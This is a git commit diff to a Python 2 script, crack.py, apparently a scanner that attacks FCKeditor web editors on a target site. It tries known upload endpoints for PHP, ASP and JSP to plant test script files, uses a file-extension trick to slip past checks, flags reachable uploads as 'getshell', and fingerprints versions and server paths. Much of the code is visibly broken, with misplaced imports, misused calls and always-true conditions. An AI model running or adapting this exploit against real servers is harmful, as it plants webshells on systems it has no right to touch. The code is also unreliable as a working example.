196b4f6f84519e835aeec9cc5e661c9f9e16cc83
d4wner <d4wner@gmail.com>
2014-08-12 17:29:38 +0800

    no lib

--- fckeditor/crack.py
+++ fckeditor/crack.py
@@ -1,63 +1,78 @@
 #!/usr/bin/env python
 #coding = utf-8
+sys.path.append("plugin/")
+import lib
 import re
 import urllib
 import urllib2
 import os
 import sys
 import httplib
-sys.path.append("plugin/")
 #import color_pr
 import time
 from poster.streaminghttp import register_openers
 from poster.encode import multipart_encode
 global url,resp
 
-def response(url,filename):
+def response(rurl,path_name):
     #params = urllib.urlencode({"Demon":"test"})
     #headers = {"Content-type":"application/x-www-form-urlencoded"}
     #conn = httplib.HTTPConnection(url)
     #conn.request("POST",filename,params,headers)
     #resp = conn.getresponse()
-    resp=urllib.urlopen(url+filename)
+    resp=urllib.urlopen(rurl,path_name)
     return resp
 
 def shell_handler():
     if response(url,"editor/filemanager/upload/php/upload.php").getcode() == 200:
-        upload_url = url+"/editor/filemanager/upload/php/upload.php?Type=Media"
+        upload_url = url+"editor/filemanager/upload/php/upload.php?Type=Media"
         try:
-            upload(upload_url,'NewFile','testphp.php')
+            resp=upload(upload_url,'NewFile','testphp.php')
+            resp_url=re.findall(r'\(.*php","',resp)[0][6:-3]
+            if response(url,resp_url).getcode() == 200:
+                print "[!]Maybe getshell==>\n"+url+resp
+
         except:
-            pass;
+            pass
         #<inputtype="file" name="NewFile" size="50"><br>
         #        <input id="btnUpload" type="submit" value="Upload">
         #        </form>
-    elif response(url,"editor/filemanager/browser/default/connectors/test.html").getcode() == 200:
-        upload_url = url+"/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/"
+    elif response(url,"editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/").getcode() == 200:
+        upload_url = url+"editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/"
         try:
-            upload(upload_url,'NewFile','testphp.php')
+            resp=upload(upload_url,'NewFile','testphp.php')
+            resp_url=re.findall(r'\(.*php',resp)
+            if resp_url[0][1:].split(',"')[0] == 201:
+                print  "[!]Maybe getshell==>\n"+url+'userfiles/file/'+resp_url[0][1:].split(',"')[1]
         except:
             pass
 
 
     elif response(url,"editor/filemanager/browser/default/browser.html").getcode() == 200:
-        upload_url = url+"editor/filemanager/browser/default/browser.html?Type=Image&Connector="+url+"editor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php"
+        upload_url = url+"editor/filemanager/browser/default/browser.html?Type=demon&Connector=connectors/asp/connector.asp"
         try:
-            upload(upload_url,'Newfile','testphp.php')
+            upload(upload_url,'Newfile','testasp.asp')
+            if response(url,'userfiles/demon/testasp.asp').getcode() == 200:
+                print  "[!]Maybe getshell==>\n"+url+'userfiles/demon/testasp.asp'
         except:
             pass
 
     elif response(url,"/editor/filemanager/upload/asp/upload.asp?Type=Image").getcode() == 200:
         upload_url = url+"/editor/filemanager/upload/asp/upload.asp?Type=Image"
         try:
-            upload(upload_url,'Newfile',"test.asp;.1.jpg")
+            upload(upload_url,'Newfile',"test.asp")
+            resp_url=re.findall(r'\(.*asp","',resp)[0][6:-3]
+            if response(url,resp_url).getcode() == 200:
+                print "[!]Maybe getshell==>\n"+url+resp_url
         except:
             pass
 
     elif response(url,"editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp").getcode() == 200:
         upload_url = url+"editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp"
         try:
-            upload(upload_url,'Newfile','test.jsp')
+            upload(upload_url,'Newfile','testjsp.jsp')
+            if response(url,'userfiles/image/testjsp.jsp').getcode() == 200:
+                print "[!]Maybe getshell==>\n"+url+'userfiles/image/testjsp.jsp'
         except:
             pass
 
@@ -75,6 +90,8 @@ def upload(upload_url,params,filename):
     register_openers()
     datagen, headers = multipart_encode({params: open(filename, "rb")})
     request = urllib2.Request(upload_url, datagen, headers)
+    resp= urllib2.urlopen(request).read()
+    return resp
 
 
 def index_of():
@@ -89,25 +106,25 @@ def index_of():
                 print "[!]Fckeditor with a dic xday==>\n"+index_dic+'\n'
 
 def xpath():
-    xpath_dics =['FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp','/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2F&NewFolderName=aux']
+    xpath_dics =['editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp','editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2F&NewFolderName=aux']
     for xpath_dic in xpath_dics:
-	html= urllib.urlopen(site+dic+xpath_dic)
-	pattern = re.compile('<p>.*,')
-	match = html.search(pattern)
-	if match:
-	    print "[!]Fckeditor xpath may be"+match.group(0)[3,-1]
+        html= urllib.urlopen(url+xpath_dic)
+        pattern = re.compile('<p>.*,')
+        match = html.search(pattern)
+        if match:
+            print "[!]Fckeditor xpath may be"+match.group(0)[3,-1]
 
 
 def info_gather():
     ver_dic={'editor/dialog/fck_about.html':['<b>.*</b><br','4','-7'],'_whatsnew.html':['Ver.*</h3','0','-4'],'editor/_source/fckeditorapi.js':['Version.*,"V','0','-2'],'editor/js/fckeditorcode_gecko.js':['Version.*",V','0','-2'],'editor/js/fckeditorcode_ie.js':['Version.*",V','0','-2']}
     for key in ver_dic:
-        html = urllib.urlopen(site+dic+key)
-	pattern = re.compile(ver_dic[key][0])
-	match = re.search(pattern,html)
-	if match:
-	    print "[!]Fckeditor ===>"+match.group(0)[ver_dic[key][1]:ver_dic[key][2]]
-	else:
-	    print "[x]Info_gather failed."
+            html = urllib.urlopen(site+dic+key)
+        pattern = re.compile(ver_dic[key][0])
+        match = re.search(pattern,html)
+        if match:
+            print "[!]Fckeditor ===>"+match.group(0)[ver_dic[key][1]:ver_dic[key][2]]
+        else:
+            print "[x]Info_gather failed."
     
 
 if __name__ == "__main__":
@@ -115,7 +132,7 @@ if __name__ == "__main__":
     site = sys.argv[1]
     url="http://"+site
     print "||===>url:"+url+"====Fckeditor Cracking====>\n"
-    resp = response(url)
+    resp = response(url,"")
     if resp.status == 403 or 200:
         shell_handler()
         index_of()
